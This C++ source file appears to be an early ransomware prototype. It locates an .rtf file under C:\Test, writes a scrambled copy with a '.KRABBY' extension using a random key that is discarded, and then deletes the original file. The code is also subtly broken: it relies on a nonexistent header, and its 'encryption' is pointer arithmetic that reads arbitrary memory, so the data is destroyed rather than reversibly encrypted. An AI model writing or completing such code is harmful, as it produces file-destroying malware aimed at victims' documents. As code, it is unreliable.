#include <iostream>
#include <fstream>
#include <list>
#include <windows.h>
#include <encryption.h>
#include <filesystem>
#include <string>
#include <dirent.h>
using namespace std;

void encrypt() {
    string targetfile;
    WIN32_FIND_DATA FindFileData;
    HANDLE hFindFile;
    LPCWSTR file = L"C:\\Test\\*.rtf";

    hFindFile = FindFirstFile(
                file,
                &FindFileData);
    if (INVALID_HANDLE_VALUE == hFindFile){
        cout << "PALCHOLDER" << endl;
    }
    else {
        wstring ws(FindFileData.cFileName);
        string name(ws.begin(), ws.end());
        targetfile = "C:\\Test\\" + name;
    }
    char p[91];

    char c;
    char a[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHJIKLMNOPQRSTUVWXYZ1234567890!{}:;/><,.|)(*&^%$#@";

    for (int i=0; i <= 89; i++) {
        p[i] = a[rand()%82];
    }

    p[90] = '\0';

    fstream fin, fout;

    fin.open(targetfile,fstream::in);
    fout.open(filesystem::path(targetfile).filename().replace_extension("KRABBY"), fstream::out);


    while (fin >> noskipws >> c) {
        char *temp = (c + p);
        fout << (char)*temp;
    }
    fin.close();
    fout.close();
    try {
      std::filesystem::copy("C:\\Users\\Windows 11\\Desktop\\Newfolder\\new - Copy - Copy - Copy - Copy.KRABBY", "C:\\Test\\new - Copy - Copy - Copy - Copy.KRABBY");
      std::filesystem::remove("C:\\Users\\Windows 11\\Desktop\\Newfolder\\new - Copy - Copy - Copy - Copy.KRABBY");
      std::filesystem::remove(targetfile);
    } catch (std::filesystem::filesystem_error& e) {
      std::cout << e.what() << '\n';
    }
}

